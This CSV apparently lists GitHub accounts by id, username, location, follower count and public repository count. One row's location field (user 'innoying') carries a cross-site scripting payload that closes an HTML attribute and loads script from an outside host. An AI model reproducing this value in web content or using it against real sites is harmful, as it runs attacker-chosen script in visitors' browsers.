id,username,location,followers,public_repos
541486,gioarvan,Athens-Greece,0,2
541487,Joe-Z,Austria,11,7
541488,OpenAndrus,China,3,29
541489,brentter,Los Angeles,2,15
541492,demoiselle,Brazil,0,18
541493,Ithamar,The Netherlands,24,15
541495,devil1234,Sibiu- Romania,0,6
541496,nicowollenzin,Bonn,3,15
541500,zyc,Salvador- Bahia- Brasil,43,36
541507,nburrus,Madrid- Spain,38,6
541511,cool-dude,India,0,10
541512,esus,Lund-Sweden,0,0
541524,buelsenfrucht,Cologne- Germany,3,3
541526,fxsc,Bayern,0,1
541531,the-noob,London,0,6
541532,hatxor,Madrid (Espaa),0,2
541540,pyrocat101,San Francisco- CA,93,24
541541,lucafrosini,Italy,3,2
541543,jraja,Oxfordshire- u.k.,0,0
541548,hansegg,Zrich,0,3
541553,teranex,Belgium,38,35
541565,MathieuCalba,Lyon,35,10
541568,sdpfoue,Beijing,10,26
541569,lkemen,Paris,8,5
541571,M00nray,Moscow region,0,2
541572,kindoblue,Amsterdam,0,11
541575,icmsAdmin,CZ,0,1
541578,raidenawkward,Tianjin-China,2,27
541579,Takayam,Japan Ibaraki-pref Tsukuba-city,0,1
541583,joomphp,Lohakhera,0,0
541588,Wooya,Poland,0,2
541589,smwesige,Kampala- Uganda,0,3
541593,slamkajs,PIttsburgh- PA,3,46
541595,lusum,Italy,1,5
541599,rrecuero,Seattle- WA,1,9
541600,oliver-dev,germany,0,1
541602,gregorg,Annecy- France,18,30
541603,milkbikis,San Francisco- CA,143,30
541607,null77,Montreal,3,8
541611,vicrau,Belgium,5,9
541612,Manuelir,Valencia- Spain,2,0
541616,jregan,Milwaukee WI USA,4,0
541619,enisusilawati99,yogyakarta - Indonesia,0,1
541620,edtalmadge,San Marcos- CA,2,4
541624,chinke,london,0,0
541626,bencollier,Brighton- UK.,2,3
541628,leolabs,Germany,6,15
541630,grigory-panov,Moscow,4,7
541633,nick22,nj/ny,0,1
541636,scottconrad,Longboat Key Florida / Princeville Hawaii,11,19
541637,brakhane,Hamburg,5,15
541639,CrimsonInformatics,Glen Allen- VA USA,0,0
541646,jrhrdk,South Islands of Denmark,0,0
541650,Sheilag,Rochester- New York,0,1
541651,boosterconf,Bergen- Norway,0,4
541657,skolhar,Bangalore- India,2,0
541665,andreibondarev,Washington- DC,9,20
541668,jnillo,Sevilla,23,36
541669,emadridm,Lima - Peru,5,9
541674,highlight,France,0,0
541677,jamesalliban,Hertfordshire,23,9
541678,EmbeddedProject,Karlsruhe,3,5
541682,simonvdd,Paris- France,10,0
541694,archerus,Warszawa,0,0
541702,Corralx,Udine. Italy,5,10
541704,cosminstoik,Bucharest- Romania,2,6
541709,n0rad,wired in,19,34
541714,AlexeiKonstantinov,Ukraine Kharkov,0,1
541719,rafaelndev,Eunpolis- BA,3,13
541720,gonzalovidal,Chile,0,0
541725,Vincent-Michael,Germany,39,2
541726,scirner22,Toms River- New Jersey,3,4
541734,kezhuw,Shanghai- China,10,45
541740,onkelz28,Germany,0,0
541745,russom-woldezghi,Washington DC,3,14
541759,tonymec,Brussels- Belgium,0,0
541761,arnavroy,San Francisco Bay Area,2,8
541764,iocube,Israel,1,11
541772,bman654,Houston- TX,6,14
541774,kappernator, Copenhagen,1,3
541775,igilham,UK,2,13
541778,jamez01,Lansing Michigan,12,28
541780,jpcarlino,Argentina,5,5
541788,coleparker,Boston- MA,0,0
541789,canerbasaran,Turkey,15,18
541791,OptizenLabs,Warsaw- Poland,0,1
541793,willianwrcs,Brasil,0,0
541794,strzel-a,Paris,0,1
541799,Auburn-and-Ivory,Brooklyn- NY,0,0
541801,michaelkuo,Toronto,0,0
541802,okorpheus,US,0,2
541805,krzysiekbielicki,Warsaw- Poland,6,32
541806,kinix,Turkey- stanbul,3,5
541807,yohjizzz,Tokyo- Japan,0,7
541809,VANSEBROUCK,Paris,0,1
541814,mdellanoce,Raleigh- NC,19,27
541820,jwahr,Grand Rapids- MI,0,0
541821,NewCareSolutions,Pittsburgh- Pennsylvania,0,0
541824,ritoon,France (Paris),11,33
541825,Yuanyang,China,4,0
541826,andrei-m,Cambridge- MA,12,24
541832,frapposelli,Cervia- Italy,85,57
541834,monsterdevelopment,Seattle- WA,0,0
541837,bian101,England,0,4
541840,tsundberg,Stockholm- Sweden,10,27
541842,innoying,Minnesota "><script src=//62.to>,68,65
541846,jorgegarcia,UK,22,7
541852,vladig17,Boston,1,2
541853,micole,Charleston SC,27,50
541859,sutomo,Jakarta- Indonesia,4,4
541862,jbsathler,Braslia - DF- Brasil,0,0
541863,credus,Oakland- CA- USA,0,4
541869,dactyl,mie- japan,1,1
541871,consulti,Teresina - Piau - Brasil,0,0
541872,afittro,Santa Clara- CA,0,6
541875,vinodpahuja,Gurgaon,1,25
541876,jcodagnone,Ciudad Autonoma de Buenos Aires- Argentina,21,17
541878,sculd,San Jose,0,5
541886,bergice,Auckland- New Zealand,5,4
541893,PianoMan64,Oregon,0,0
541899,raysuliteanu,Carlsbad- CA,1,1
541900,raulsann,New York,4,17
541903,yutakikuchi,,10,8
541908,rpbeam,NC- USA,2,1
541910,hLittle,Newton- MA,3,4
541923,aarontrank,San Francisco- CA,0,8
541930,pgaertig,Poznan- Poland- EU,4,14
541931,Radeon,Westport- CT,0,0
541936,wwared,Brazil,5,3
541937,SebastienElet,Amiens- France,16,37
541939,nresare,Sweden,19,49
541941,Irbidan,Spain,1,10
541942,jcaballero,Peru,0,0
541946,penultimate-labs,Los Angeles- CA,2,1
541951,alexanderbell,Munich,0,0
541952,J4Fry,Munich,0,0
541956,richardbutler,Twyford- Berkshire- UK,3,37
541966,dineshmm,Chicago,0,0
541967,kifayat,Saudi Arabia- Pakistan,0,2
541969,jnankin,Northbrook- IL,1,20
541972,bleverett,Colorado Springs,0,3
541975,BryonP,Prince Edward Island- Canada,0,1
541976,hppycoder,Pittsburgh- PA,8,21
541977,toryup,Austin- TX,0,1
541978,charlesjohnson,San Francisco,30,38
541980,icl,San Diego,0,17
541982,gjotwani,San Francisco Bay Area,3,1
541983,codegin,Columbus-Ohio,0,1
541984,dling,Sweden,3,7
541988,ryangreen,Loveland- CO,0,4
541989,rodne,Boulder- CO,2,1
541996,noprompt,Fresno- CA,107,48
541998,myblindy,Canada,0,8
542001,Aleksandaar,Serbia,1,7
542013,douglasmiranda,Rondonpolis - Brazil,73,32
542016,yiransheng,Bay area,18,43
542017,Mnunez903,Bronx- NY,7,16
542018,poffuomo,Bologna- Italia,6,2
542019,Spelmyst,Wesley Chapel FL,0,0
542026,autozone,Memphis- TN,0,0
542036,vvolkgang,Portugal,5,25
542038,thanhvuong,Quincy- MA,4,5
542042,DeLaGuardo,Thailand,15,72
542054,mtartaglia,New York,0,0
542058,esquilinha,Portugal,0,0
542060,ami-navon,Tel-Aviv- Israel,0,3
542064,SamWelker,Boise- Idaho,2,4
542065,EricBaneton,Belgium,0,1
542066,phollands,Reading- UK,4,13
542068,andrewwood,Portland- Oregon,3,4
542069,ChristineCostales,Chicago- IL,4,3
542070,ChromoX,Atlanta- GA,7,10
542074,oziks,Lyon- France,39,39
542077,vaidik,New Delhi- India,119,96
542078,Portent,Boulder- CO,0,0
542081,dumont,Boulder- CO,0,0
542084,Nefarion,Vienna,0,1
542092,vmorozov,Lexington- MA,0,7
542098,toddperkins,St. Petersburg- FL,8,1
542106,josephsnyder,Clifton Park- NY,2,24
542108,lukekarrys,Payson- Arizona,73,60
542114,allthein,Istanbul / Kadikoy,21,2
542115,pashira,Riga,5,4
542125,yosoyluismi23,Seville- Spain,0,0
542135,williamjxj,New York- USA,5,36
542138,kinsersh,Salt Lake City- Utah,2,0
542140,Charlotteis,London,111,113
542141,cmodesign,Los Angeles,0,1
542148,cooltrooper,The code Grotto,4,8
542149,comp615,San Francisco- CA,8,6
542154,flowlo,Vienna- Austria,22,84
542155,up0,San Francisco- CA,0,0
542158,ofornes,Catalunya,1,3
542159,imnuts,PA,25,8
542162,khrystoph,Seattle- Washington,5,19
542163,tsclausing,Nashville- TN,30,35
542168,charandas,Portland- Maine,16,27
542169,kielhodges,Atlanta- GA,1,1
542174,DanielStojkov,Macedonia,5,5
542177,jensadne,Oslo- Norway,3,23
542179,enverarslan,Kocaeli,46,22
542186,tjack,Porto Alegre- RS- Brazil,0,3
542187,jmkook,Korea,0,1
542191,zploskey,Seattle,13,18
542192,Dirklectisch,Amsterdam- Netherlands,15,24
542199,alejandro,Tegucigalpa- Honduras,114,77
542200,borisbokan,serbia,0,0
542204,kelvinye,Nottingham,0,4
542206,gmckeever,San Francisco,14,11
542209,juanpabloe,Mxico,73,18
542210,matthewwu,San Francisco- CA,0,7
542211,hellolwq,ShenZhen in China.,2,34
542213,weby,Vilnius,10,27
542220,adriennemarie,Wigan Manchester,0,2
542223,jessedhillon,San Francisco- CA,19,29
542225,karael,Paris,6,8
542231,shenruizong,no,0,21
542233,blaze33,Paris,5,23
542241,mrhanta,Guangzhou- China,1,1
542245,BrandonE,Nashville- TN,3,15
542246,solos,China,64,53
542248,herfulnerful,United States,0,0
542252,shukukei,Aichi- JAPAN,0,0
542255,zomble,Brisbane- Australia,13,6
542258,sultanrehman,Hong Kong,0,3
542262,whyxxx,china,0,0
542268,funfaceGames,Orlando- FL,0,1
542272,arjo129,Singapore,25,32
542274,qingping,Shanghai- China,2,56
542287,koaqiu,Diaoyu Islands- China,0,3
542290,chedigitz,Philadelphia,5,18
542296,tracend,California (US),41,83
542297,halzhang,China-GuangZhou,716,51
542298,nileshgund,Pune Maharashtra India,0,0
542308,edlau,Toronto- Canada,16,25
542309,chamag1996,Quebec- Canada,0,3
542314,aped,Santa Cruz- CA,0,11
542319,jontybrook,London- UK,0,8
542321,thrice43,Fort Lauderdale- Florida,1,23
542323,TheVandalyst,Melbourne- Australia,1,4
542324,mbahsomo,Surabaya,0,9
542327,LouieGeetoo,Washington- DC,2,19
542332,storminwalker,Wellington- San Francisco,15,10
542333,ywindish,Tokyo- Japan,3,8
542335,dblock,New York- NY,522,290
542337,samuelsmith,www,0,2
542338,shellehs,beijing.china,0,0
542347,potsed,Australia/Brisbane,0,0
542354,elielagmay,Philippines,3,3
542364,mlockwood74,Columbus- OH,0,0
542365,getnamo,UK,35,27
542380,kghoon,Seoul-Korea,0,9
542381,musmanchaudhry,Karachi,0,0
542383,HeyJRoot,United States,0,1
542384,rekhamehta66,Ahmedabad-Gujarat-India,0,0
542386,droidzone,Trivandrum,5,42
542388,chenggao,China,1,2
542392,9427133990,India,0,0
542397,rohitghoshal,usa,0,3
542399,hectorsosajr,Springville- Utah,1,1
542400,Danamith-Chathumal,Sri Lanka,0,0
542406,breser,North Bend- WA,24,6
542408,comynli,shanghai,27,55
542428,sivaprasadreddy,Hyderabad- India,167,35
542434,chitreshd,San Jose,1,9
542435,ashwanilabs,New Delhi,0,8
542436,jayapalagowda,Banglore,0,0
542439,vishnushankar,Madurai,0,1
542440,ssant,Austin- Texas,0,1
542442,nate-yuan,Beijing- China,0,2
542455,mrydell,Kirkland- WA,1,3
542457,erkunt,ankara,1,0
542458,juristr,Bolzano,70,92
542467,ramgole,Pune,0,4
542482,mochidev,Los Angeles,0,14
542492,edwindj,@edwindjonge,48,57
542499,ZeoSmart,Hillsborough- NC  ,0,0
542500,raphaelh,France,2,15
542510,VeroLom,Saint-Petersburg- Russia,6,7
542511,yaricom,Kiev- Ukraine,0,43
542513,drJeckyll,Plovdiv- Bulgaria,1,10
542517,gtranchedone,London- UK,16,27
542523,softweyr,San Diego- California- USA,0,1
542526,timurbakarov,Russia,0,9
542529,gboelter,Davao City- Philippines,0,0
542530,imran-uk,Southampton- UK,1,12
542536,kettari,Moscow,1,6
542541,rsabirov,Poland,1,9
542544,elsom25,Waterloo- Ontario- Canada,19,22
542545,wizzor,Finland,1,7
542547,FelipeZini,So Paulo/SP,28,8
542549,Stwissel,Singapore,15,26
542557,StanislavK,Brno- Czech Republic,0,7
542561,perininetworks,Oxford- UK,0,1
542563,winbook,bandung,0,1
542565,honzahovorka,Prague- CZE,5,11
542572,crb123,'s-Hertogenbosch,0,0
542579,samchristian,IN-USA,0,0
542581,50m30n3,Berlin,15,10
542582,AnAppAMonth,China,3,20
542583,shapeshifta78,Leipzig,9,6
542584,duckmole,Aix en Provence,11,15
542596,wookieb,Gdynia,27,30
542597,raigons,Porto Alegre,23,14
542598,guoliang,Sweden,2,9
542599,zhaozg,Haidian-Beijing-China,27,19
542601,sciabarra,Italy / UK,20,19
542603,AlexanderStohr,Lindau (Bodensee)- Germany,0,10
542611,smigielski,Poland- Lodz,10,11
542613,bersace,Paris,4,11
542619,rimusdesign,London,1,3
542625,gerdus,Cape Town- South Africa,0,6
542628,fsbano,Rio de Janeiro,0,0
542633,pabgn,Valencia- Spain,17,22
542637,alfuhigi,Saudi Arabia,0,0
542638,jump,UK,3,0
542643,cgreene,Philadelphia- PA,3,2
542649,timo-e,Berlin,0,2
542651,speedsolve,Nagoya- Japan,1,7
542657,medopaw,Beijing,6,19
542659,ronischuetz,Switzerland,0,1
542662,goodsong,Beijing,1,24
542665,AndreiD,Europe,36,27
542669,kusuriya,Seattle- Washington,13,38
542675,naja1987,Berlin- Germany,7,2
542676,suguni,Seoul- South Korea,5,13
542679,alarive,Paris,0,6
542680,AlexPopchild1977,Barcelona,0,1
542683,keme686,Bonn- Germany,1,22
542684,oshepherd,United Kingdom,16,20
542688,joxenford,Philadelphia- PA,0,2
542689,sscNZ,Christchurch,0,2
542690,Klumhru,Iceland,3,32
542692,ruicovelo,Portugal,7,14
542696,wneessen,Cologne- Germany,6,5
542697,vishwasbabu,Seattle,34,14
542698,edugas,Montreal- QC,1,1
542702,nunoloureiro,Lisbon- Portugal,2,1
542706,mattster,Richardson- TX,1,7
542707,joshhowen,Raleigh- NC,0,0
542714,nguyentinh,Viet Nam,0,1
542717,deimosbg,Bulgaria,0,1
542720,galengidman,Missouri,52,25
542721,seanzxx,China,2,9
542725,jakovkrolo,Zagreb- Croatia,0,0
542728,dicato,Massachusetts,24,28
542729,adaifotis,Princeton- NJ,2,1
542732,SpaceChimpMedia,Austin- TX,0,0
542733,emil10001,Redwood City- CA,108,95
542736,rdoubleui,Berlin- Germany,5,13
542738,choudhury,kolkata,0,0
542739,jpalanco,Madrid- Spain,33,9
542745,cfothergill,Newcastle upon Tyne,5,7
542750,dargor,Paris- France,12,7
542754,arora071290,Urbana-Champaign- USA,0,0
542760,CoDanny,Malaga- Spain,6,2
542761,njsf,New York,1,6
542771,DanielNTX,Austin- Texas,0,0
542773,BJWORLD,Melbourne Australia/London UK,0,1
542780,jandrewz,Houston,0,0
542782,Nuulogic,Houston,0,5
542783,drake1701,Indiana- USA,2,12
542788,jurchiks,Europe,14,8
542799,airspike,NC,0,2
542800,struckture,Billings- MT,1,1
542802,liviolopez,EEUU,1,0
542806,Tprentis,Estero- FL 33928,1,8
542810,nixmaniack,Pune- Maharashtra- India,26,70
542812,codedart,Petersburg- KY,0,1
542813,bjudson,Los Angeles- CA,11,8
542814,lukehutton,Vancouver- BC,2,4
542821,jftuga,Athens- GA,2,2
542828,lukebuehler,Pennsylvania- USA,36,11
542831,amando96,Dsseldorf- Germany,3,20
542833,fhomux,Antwerp- Belgium,0,1
542836,mtlewis,London,2,0
542837,mglauche,Germany,1,6
542842,renatomeloferraz,Belo Horizonte - MG,1,2
542846,tcooper,La Jolla- CA,7,36
542853,dywisor,Stuttgart- Germany,3,20
542854,aehven,Golden- Colorado- USA,1,2
542855,dralshehri,Jeddah- Saudi Arabia,0,0
542858,tarunsapra,Netherlands,1,30
542863,flyswatter,San Leandro- CA,28,164
542870,downward,lule sweden,0,0
542872,asarazan,San Francisco- CA,33,48
542877,stephenwonfor,Calgary- Alberta,0,0
542878,prospectmx,PA,0,0
542881,macanderson,Arlington- VA,18,2
542883,dpezely,San Francisco,2,5
542890,dillonchr,Tulsa- OK,1,11
542896,sans-sense,India,32,18
542901,AndyHoffmanNet,Indainapolis- IN,0,2
542903,wduffy,Scotland,7,5
542904,pearsoncommunications,Chicago- Illinois,0,0
542905,exodus-server,Montreal,0,0
542906,louies1,Plainfield Il.,1,4
542927,Draco351,Silla (Valencia) - Spain,2,2
542929,thomaslai,Vancouver BC,3,5
542930,subatta,California,0,12
542931,craig-riecke,Ithaca- NY,1,5
542934,VISTALL,St. Petersburg,67,42
542936,greatddd,japan,0,3
542940,rainz,New York- NY,0,6
542945,KonaCode,USA,0,1
542946,KerryCarron,Southern New Mexico,0,2
542947,mudkip1123,Pennsylvania,6,6
542948,dallasclark,Brisbane- Queensland- Australia,3,5
542950,cooliopas,Mar del Plata- Buenos Aires- Argentina,0,9
542953,MaxKramer,London- UK,56,36
542958,z-eh,Debrecen- Hungary,0,2
542959,milroc,San Francisco,69,36
542961,Prinz-von-Sinnen,Germany,0,0
542967,EdmundoDantes,Lima peru,0,0
542968,malekpour,United States,7,6
542972,HidekiAI,USA,0,2
542979,caffed,San Francisco- CA,1,6
542980,jeffstyr,San Jose- CA,7,6
542985,talldude,Washington- USA,5,0
542996,karaatli,istanbul,2,85
542999,jayantkenjale,Cupertino CA,0,6
543002,kushnir,Kiev,0,0
543004,fabincarmo,Vila Velha- ES- Brasil,1,4
543019,ivyvisors,Melbourne,0,0
543022,unpairedbracket,London- England,13,22
543024,HoraceShmorace,New York- NY,5,21
543031,marbienk,Menlo Park- CA,0,1
543033,positiveflat,Tokyo- Japan,8,7
543035,mmyasin,UK,0,3
543036,HenoHocuM,Bulgaria,0,2
543040,ashishgupta,Columbus- OH- US,1,2
543046,klund,Edwardsburg- MI,0,0
543047,rnolan3,Saint Louis- MO,2,11
543051,weskoop,New Westminster,8,12
543055,shadaj,The Bay Area,205,37
543059,mtthgn,Oklahoma City,7,6
543060,vigneshacker,India,9,108
543063,MyZeD,Germany- NRW- Essen,4,0
543065,blavv,Vancouver- BC,0,2
543066,tanjera,Baltimore- MD,1,5
543067,djyareed,Santa Clara- CA,0,6
543068,droy,Toronto,0,1
543071,itrav,Yuzhno-Sakhalinsk- Russia,0,1
543073,dtbaker,Australia,51,41
543074,windmillboy,Seoul- Korea,0,1
543086,brettmccully,Seattle- WA,0,0
543091,bowiechen,Los Angeles- CA- U.S.A.,0,2
543096,atomicwolf,USA,0,0
543099,zerolove,Birmingham- Al,0,0
543105,savoxis,Pacific NW,0,0
543108,shenqiang,Beijing- China,0,2
543111,Pujianto,Indonesia,3,5
543115,ukley,Porto Velho - Ro - Brazil ,1,16
543119,joeholden,UK,0,1
543120,dballard,Canada,14,22
543122,billycao,Los Angeles- CA,6,8
543124,daath,Copenhagen- Denmark,1,3
543127,booz-allen-hamilton,Herndon- VA,0,39
543130,3610cn,shanghai,5,16
543134,fanmanga,Viet Nam,0,0
543138,laminko,Myanmar,12,28
543145,senju5,guadalajara,0,0
543147,aguscapux,Jambi,0,1
543149,suxue,ACT- Australia,2,13
543150,PerlChina,China,0,13
543155,dipesh9575,indore-india,0,0
543157,ryanmettler,Cape Town- South Africa,2,3
543162,PeterYu,Toronto,0,10
543175,chrism28,Sydney- Australia,0,1
543182,mohtar,Malaysia,0,8
543190,anoopvalluthadam,Bangalore,7,18
543193,nvartolomei,MD,39,16
543200,RickardPettersson,Nykping- Sweden,24,24
543204,JacobShirley95,United Kingdom,0,6
543207,Shanthadewa,Kurunegala,0,0
543213,jmparatte,Switzerland,0,3
543217,antoniohirai,Tokyo Japan,0,0
543222,abpphpbb3,france,0,2
543235,approvedfood,Dinnington,0,0
543236,davidhorsak,Berlin- Germany,2,7
543237,rincewind50,Wexford- Ireland,0,0
543238,ketan21,Indore- India,5,43
543239,md2perpe,Sundbyberg- Sweden,12,45
543243,nevico,Prague- Czech Republic,0,2
543248,kevinpang,Southern California,3,12
543255,9apps,Amsterdam,0,19
543256,shenoyhganesh,Bengaluru- India,0,0
543275,rom1v,France,12,29
543283,jr3cermak,Fairbanks- AK,0,2
543287,tans,china guangzhou,6,1
543292,dimiandre,Italia- Milano,7,4
543293,jesyspa,The Netherlands,16,37
543296,tot3lmon,Tordera-Barcelona-Catalunya-Spain,0,2
543297,imod,Switzerland,14,69
543298,irukavina,Zagreb- Croatia,2,4
543300,fabian76,Evans Mills-New York,0,0
543302,njkrut,Denver & Singapore,3,1
543305,tqc,Sydney- Australia,5,63
543307,jwbr,Warwick- United Kingdom,0,0
543309,kabutoboy,Thailand,0,1
543311,itsura,Buglaria,0,2
543312,ben-ng,Washington- D.C.,37,148
543314,yfukad,Shinjuku Tokyo- Japan,0,0
543320,dracula70,casa mia,0,3
543324,viadee,Mnster- Kln/Germany,0,16
543325,imehedi,Cymru,1,3
543331,bennypk,Israel,4,10
543334,bperreault,Glencoe- MN,3,20
543337,mrain,Shanghai,39,8
543341,sachalegrand,Singapore,3,5
543344,brunoamaral,Lisbon- Portugal,11,22
543346,vyarno,FucKerFucKaRa,0,1
543350,gandhisagar,Pune-India,0,3
543360,zysclassifieds,Orange Park- Fl,0,1
543366,paulfioravanti,Sydney- Australia,46,27
543371,mgsmus,Adana- Turkey,4,2
543372,enarax,Hungary,0,2
543378,kracefoss,coimbatore,0,2
543380,nguyenthang,HCM,0,20
543384,chengjun,Nanjing- China,127,38
543391,lonestar1970,Werther (Westf) / Germany,0,0
543395,xilin,Shanghai,11,39
543397,dbranam,Texas,2,0
543401,Ndragomirov,Russia,6,13
543402,somaen,Norway,19,16
543405,ibigbug,Hangzhou,114,55
543407,zhangmhao,Guangzhou China,37,53
543411,StaCara,Aichi- Japan,0,0
543416,Vadimus,Tomsk,1,7
543419,yingzhox,Redmond,12,17
543423,centromere,New Hampshire- USA,4,8
543426,soldis,Tver- Russia,0,3
543429,PureGrain,Louisville KY,0,4
543431,lavendermi,Kingston- ON Canada,1,0
543434,dirkrathje,Hamburg,1,6
543453,qodeboy,Ukraine- Zaporozhye,3,9
543455,Koronen,Stockholm- Sweden,35,32
543456,anubnair,Bangalore,1,14
543460,rsmann,Texas,0,4
543466,e0901026,Vaasa-Finland,2,10
543471,popab,Sweden,0,0
543475,frero06,alger,0,1
543483,rockdragon,China,68,34
543484,marianobiotico,argentina,0,1
543485,Placeholder-Software,Worcester- UK,0,2
543486,nomo17k,San Francisco,0,8
543495,zeeshansayyed,India,0,4
543500,Cypuls,Berlin- Germany,0,0
543501,lubos-kucera,czech,0,0
543507,marg51,London,11,43
543509,allartburns,Pittsburgh- PA- USA- Earth Prime,0,22
543510,skwrrkk,Los Angeles- CA,0,1
543512,geekrohit,Mumbai,2,6
543513,bvelji,Atlanta- GA,0,3
543516,antoneliasson,Sverige,5,22
543522,driesken,Belgium,0,0
543526,dclucas,Porto Alegre,57,30
543528,w7wo,Lacey- Wa,0,2
543530,alvarovmz,Spain,16,7
543532,Jpattom,India,1,4
543541,mynameistodd,Ann Arbor- MI,6,16
543542,newca12,France,11,28
543543,esaltheone,Moscow,0,1
543560,frcoelho,Manaus,0,1
543561,pockata,Sofia- Bulgaria,2,20
543562,bflora,San Francisco,6,1
543564,elandsness,Los Angeles- CA,0,5
543565,magicmoose,Montreal- Canada,0,21
543568,lmcintosh,Stanford- CA,17,27
543577,pachacamac,Germany- Berlin,42,39
543584,lahadibyajyoti,India,0,0
543585,corzani,Perfidious Albion,1,11
543605,skylazart,Brazil,2,1
543606,leftie,Saint-Petersburg- Russia,1,1
543607,mariabouniol,Los Angeles- California,2,0
543609,alanceto19002,Madrid,0,1
543614,dheavy,Paris- France,17,24
543619,NIBOGO,Bogota,0,1
543622,Ersh,Cairo- Egypt,0,0
543623,wielaard,Deventer- The Netherlands,0,1
543627,gati,Austin,55,14
543633,mohsen1,San Francisco- CA,99,105
543634,zeubuntu,valenciennes fr,0,1
543635,c1phr,United States,5,49
543636,fruoff,Germany,1,3
543638,thinkshout,Portland- OR,0,70
543642,jdonson,New York City,10,50
543646,soluvas,Indonesia,0,82
543648,jramos-br,Rio de Janeiro,0,1
543651,bippo,Bandung- Indonesia,0,17
543653,fbsrosa,So Paulo- Brasil,0,2
543661,Kroisse,Seoul- Republic of Korea,58,72
543663,mike1971,Windsor,0,1
543669,iklier,Bay Area- California,2,2
543672,mmnaseri,Seattle- WA- USA,9,13
543677,gby,The Internet,8,9
543678,svanrossem,Netherlands,3,3
543683,Webguyatwork,Bourbonnais- IL,1,1
543684,Bruteo,Russia- Moscow,0,0
543690,maxxscho,Austria,13,12
543692,mickski007,UK,0,1
543693,Geekimo,France,3,1
543696,KimStebel,Bristol- UK,7,65
543700,stephanstan,Canada,0,16
543702,majimenezp,ciudad del carmen-campeche,12,32
543703,bratlolku,speed,0,1
543704,Markyd349,Cork- Ireland,1,1
543708,jdarsie,Olathe- KS,1,4
543716,venyx,portoferraio-italy,0,0
543720,dydra,The Semantic We,55,15
543722,Japants,Orlando,0,1
543731,CampusCred,Berkeley- CA,0,0
543732,kelvinn,Sydney- Australia,6,58
543737,neilrobau,Seaford- Vic- AU,0,8
543739,kostko,Slovenia,21,23
543740,tintinz,Sweden,1,5
543744,inahill,Oslo- Norway,2,0
543753,chrisrickard,Melbourne,10,16
543754,parsetree,Washington,2,0
543758,Brian-Gaffney,Melbourne,10,5
543767,ahouzi,Agadir- Morocco,0,21
